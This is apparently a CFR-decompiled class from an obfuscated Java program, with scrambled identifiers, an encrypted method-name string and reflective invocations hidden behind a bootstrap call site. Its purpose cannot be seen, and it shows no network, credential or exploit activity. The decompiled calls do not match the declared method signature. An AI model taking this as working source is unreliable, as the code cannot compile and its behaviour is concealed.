/*
 * Decompiled with CFR 0_123.
 */
import java.lang.invoke.ConstantCallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.Method;

class dDgX$3
extends CxNA {
    private final /* synthetic */ Thread FyiI;

    dDgX$3(Thread thread) {
        this.FyiI = thread;
    }

    @Override
    public void run() {
        dDgX$3.Vp((Thread)o.a(this, 298866423));
        try {
            dDgX$3.Vp((Thread)o.a(this, 298866423));
            String string = (String)dDgX$3.Vp(dDgX$3.Vp(dDgX$3.Vp((Thread)o.a(this, 298866423)), FMkR$WjFM.a("\ub1ef\uffb4\udc6a\uc3f0\u1e1f"), new Class[0]), (Thread)o.a(this, 298866423), new Object[0]);
            dDgX$3.Vp(string);
            return;
        }
        catch (Throwable throwable) {
            return;
        }
    }

    private static Object Vp(Object object, Object object2, Object object3) {
        try {
            return new ConstantCallSite(((MethodHandles.Lookup)object).unreflect(o.Y(Integer.valueOf((String)object2, 32))).asType((MethodType)object3));
        }
        catch (ClassNotFoundException | IllegalAccessException reflectiveOperationException) {
            throw new BootstrapMethodError(reflectiveOperationException);
        }
    }
}

